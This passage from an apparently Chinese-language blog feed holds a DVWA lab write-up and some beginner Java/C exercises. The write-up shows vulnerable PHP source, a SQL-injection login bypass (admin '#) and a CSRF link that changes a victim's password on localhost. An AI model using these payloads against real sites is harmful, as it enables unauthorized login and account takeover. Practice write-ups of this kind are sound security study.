      <url>/2023/07/21/DVWA/</url>
      
        <content type="html"><![CDATA[<h3 id="方法二：SQL注入"><a href="#方法二：SQL注入" class="headerlink" title="方法二：SQL注入"></a>方法二：SQL注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>通过观察上面的代码可以发现在下面语句</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>可以通过admin ‘#绕过</p><p><img src="https://img1.imgtp.com/2023/07/21/CJFqwv9N.png" alt="9.png"></p><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>命令注入,是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。</p><p>源代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/func-string-stristr.html">PHP stristr()函数</a><br><a href="https://www.php.net/manual/zh/function.php-uname.php">PHP php_uname()函数</a><br>ping -c 4 这里的4是指设置完成要求回应的次数。</p><p><img src="https://img1.imgtp.com/2023/07/21/0F3N7LJr.png" alt="1689930000890.png"></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>跨站请求伪造漏洞</p><p>本质就是在不知情的情况下执行请求<br>GET和POST俩种类型<br>主要是看抓包能不能抓到参数并且修改</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这里可以通过构造链接的方法：<br><a href="http://localhost/DVWA-master/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#">http://localhost/DVWA-master/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</a><br>当受害者点击了这个链接，他的密码就会被改成123456<br><img src="https://s2.loli.net/2023/07/23/T9NcIxyGHjvKJrQ.png" alt="image.png"><br>但这种连接容易被人看出来，也可以通过写一个简单的html页面来攻击<br>因为前面改了123456所以这里用password<br>这时用123456来登陆就不行了<br><img src="https://s2.loli.net/2023/07/23/GRE7Hk1uzSTVPYo.png" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java随笔</title>
      <link href="/2023/05/29/java%E9%9A%8F%E7%AC%94/"/>
      <url>/2023/05/29/java%E9%9A%8F%E7%AC%94/</url>
      
        <content type="html"><![CDATA[<h1 id="和1与，看是否为0，判断32次"><a href="#和1与，看是否为0，判断32次" class="headerlink" title="和1与，看是否为0，判断32次"></a>和1与，看是否为0，判断32次</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (a &amp; <span class="number">1</span> == <span class="number">1</span>)</span><br><span class="line">count++;</span><br><span class="line">a = a &gt;&gt; <span class="number">1</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, count);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">      <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((a &amp; <span class="number">1</span>) == <span class="number">1</span>)</span><br><span class="line">               count++;</span><br><span class="line">       a &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       sc.close();</span><br><span class="line">       System.out.println(<span class="string">&quot;1的个数为 &quot;</span> + count);</span><br><span class="line">       </span><br><span class="line">       <span class="comment">//另一种写法</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">15</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">cc</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">while</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> ((n &amp; <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">               cc++;</span><br><span class="line">           &#125;</span><br><span class="line">           n &gt;&gt;&gt;= <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><h2 id="妙妙方法"><a href="#妙妙方法" class="headerlink" title="妙妙方法"></a>妙妙方法</h2><p>一个数字与上这个数字减一的数，该数二进制最右边的1必然会消除掉，以此类推，从右往左，每一次进行按位与操作，都会取消掉一个1，直到该数字变为0，跳出循环，就得到了该数字二进制中1的个数。<br>以21(0001 0011)为例：</p><p>0001 0011</p><p>0001 0010</p><p>0001 0010 第一次与的结果 </p><p>0001 0001 </p><p>0001 0000 第二次与的结果</p><p>0000 1111</p><p>0000 0000 第三次与的结果，跳出循环，count &#x3D; 3;</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (a != <span class="number">0</span>) &#123;</span><br><span class="line">a = a &amp; (a - <span class="number">1</span>);</span><br><span class="line">count++; </span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, count);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">15</span>;</span><br><span class="line">   <span class="type">int</span> <span class="variable">ccc</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">while</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">       n = n &amp; (n - <span class="number">1</span>);</span><br><span class="line">       ccc++;</span><br><span class="line">   &#125;</span><br><span class="line">   System.out.println(ccc);</span><br></pre></td></tr></table></figure><h1 id="水仙花数"><a href="#水仙花数" class="headerlink" title="水仙花数"></a>水仙花数</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">   <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">   <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">100</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">       a = i % <span class="number">10</span>;</span><br><span class="line">       b = i / <span class="number">10</span> % <span class="number">10</span>;</span><br><span class="line">       c = i / <span class="number">100</span>;</span><br><span class="line">       <span class="keyword">if</span> (Math.pow(a, <span class="number">3</span>) + Math.pow(b, <span class="number">3</span>) + Math.pow(c, <span class="number">3</span>) == i)</span><br><span class="line">           System.out.println(i);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">100</span>; i &lt; <span class="number">999</span>; i++) &#123;</span><br><span class="line">           <span class="type">int</span> <span class="variable">tem1</span> <span class="operator">=</span> i;</span><br><span class="line">           <span class="keyword">while</span>(tem1 != <span class="number">0</span>) &#123;</span><br><span class="line">               tmp += Math.pow(tem1 % <span class="number">10</span>, <span class="number">3</span>);</span><br><span class="line">               tem1 /= <span class="number">10</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span> (tmp == i)</span><br><span class="line">               System.out.println(tmp);</span><br><span class="line">           tmp = <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><h2 id="拓展：一个整数的各个位数的位数次方"><a href="#拓展：一个整数的各个位数的位数次方" class="headerlink" title="拓展：一个整数的各个位数的位数次方"></a>拓展：一个整数的各个位数的位数次方</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; <span class="number">999999</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">//记录位数</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> i; <span class="comment">//保存i值，以免影响for循环</span></span><br><span class="line">            <span class="keyword">while</span> (tmp != <span class="number">0</span>) &#123;</span><br><span class="line">                tmp /= <span class="number">10</span>;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">            tmp = i;<span class="comment">//再次用来求各个位数</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">//保存各个位数的位数次方</span></span><br><span class="line">            <span class="keyword">while</span>( tmp != <span class="number">0</span> ) &#123;</span><br><span class="line">                sum += Math.pow(tmp % <span class="number">10</span>, count);</span><br><span class="line">                tmp /= <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (sum == i)</span><br><span class="line">                System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="5-30学习笔记"><a href="#5-30学习笔记" class="headerlink" title="5_30学习笔记"></a>5_30学习笔记</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created with IntelliJ IDEA</span></span><br><span class="line"><span class="comment"> * Description</span></span><br><span class="line"><span class="comment"> * User: yxz</span></span><br><span class="line"><span class="comment"> * Data: 2023-05-30</span></span><br><span class="line"><span class="comment"> * Time: 14:12</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test530</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main8</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 求最大公约数 */</span></span><br><span class="line">         <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">         <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">         <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">rand</span> <span class="operator">=</span> a % b;</span><br><span class="line">         <span class="keyword">while</span>(rand != <span class="number">0</span>) &#123;</span><br><span class="line">             a = b;</span><br><span class="line">             b = rand;</span><br><span class="line">             rand = a % b;</span><br><span class="line">         &#125;</span><br><span class="line">        System.out.println(b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main7</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 判断素数方法2 */</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (;i &lt; Math.sqrt(n); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (n % i == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;不是素数&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt; Math.sqrt(n)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;是素数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main6</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 判断素数 */</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">7</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (; i &lt;= n / <span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (n % i == <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;不是素数&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt; n / <span class="number">2</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;是素数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main5</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 输出整数的2进制 偶数位序列 奇数位序列 */</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">31</span>; i &gt;= <span class="number">1</span>; i -= <span class="number">2</span>) &#123;</span><br><span class="line">            System.out.print(((a &gt;&gt; i) &amp; <span class="number">1</span>) + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;<span class="comment">//偶数位</span></span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">30</span>; i &gt;=<span class="number">1</span>; i -= <span class="number">2</span>) &#123;</span><br><span class="line">            System.out.print(((a &gt;&gt; i) &amp; <span class="number">1</span>) + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;<span class="comment">//奇数位</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main4</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/*  输入密码 */</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">while</span> (count != <span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;请输入你的密码,共有&quot;</span> + count + <span class="string">&quot;次机会!&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">pass</span> <span class="operator">=</span> sc.nextLine();</span><br><span class="line">            <span class="keyword">if</span> (pass.equals(<span class="string">&quot;123&quot;</span>)) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;登陆成功&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;密码错误&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            count--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main3</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 输出整数的每一位 */</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="keyword">while</span> (sc.hasNextInt()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">            <span class="keyword">while</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.print( n % <span class="number">10</span>);</span><br><span class="line">                n /= <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main2</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 乘法口诀表 */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">                System.out.print(i + <span class="string">&quot;*&quot;</span> + j + <span class="string">&quot;=&quot;</span> + i * j + <span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* X形图案 */</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="keyword">while</span> (sc.hasNextInt()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((i == j) || (i + j == n - <span class="number">1</span>)) &#123;</span><br><span class="line">                        System.out.print(<span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created with IntelliJ IDEA</span></span><br><span class="line"><span class="comment"> * Description</span></span><br><span class="line"><span class="comment"> * User: yxz</span></span><br><span class="line"><span 